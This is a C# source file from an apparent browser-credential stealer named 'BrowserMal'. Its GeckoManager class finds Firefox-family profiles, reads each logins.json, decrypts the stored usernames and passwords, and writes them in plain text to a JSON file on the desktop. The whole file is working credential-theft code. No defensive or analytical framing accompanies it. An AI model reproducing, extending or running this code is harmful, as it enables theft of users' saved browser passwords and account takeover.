using BrowserMal.Browser;
using BrowserMal.Model;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.IO;
using BrowserMal.Encryption;
using BrowserMal.Util;
using System;

namespace BrowserMal.Manager
{
    public class GeckoManager<T> : Manager<T>
    {
        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
        {
        }

        public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType = "")
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                List<string> profiles = GetAllProfiles(browser.Location);
                List<T> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);

                if (creds.Count == 0)
                    continue;

                _resultList.Add($"{browser.Name}_{GetTableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{GetTableName.Replace(".json", "")}.json");
            }

            return _resultList;
        }

        private List<T> FetchFiles(List<string> profiles, string name, string specificProfile)
        {
            List<T> result = new List<T>();

            foreach (string profile in profiles)
            {
                string loginFile = Path.Combine(profile, "logins.json");

                if (File.Exists(loginFile))
                {
                    if (!loginFile.Contains(specificProfile) && !string.IsNullOrEmpty(specificProfile))
                        continue;

                    GeckoDecryption geckoDecryption = new GeckoDecryption();
                    geckoDecryption.Init(profile, name);

                    GeckoLogin geckoLogin;

                    using (StreamReader sr = new StreamReader(loginFile))
                    {
                        string json = sr.ReadToEnd();
                        geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
                    }

                    foreach (GeckoLoginData login in geckoLogin.logins) 
                    {
                        string username = geckoDecryption.Decrypt(login.encryptedUsername);
                        string password = geckoDecryption.Decrypt(login.encryptedPassword);
                        string hostname = login.hostname;

                        T obj = CreateInstanceOfType(new object[] { hostname, username, password });
                        result.Add(obj);
                    }

                    break;
                }
            }

            return result;
        }
    }
}
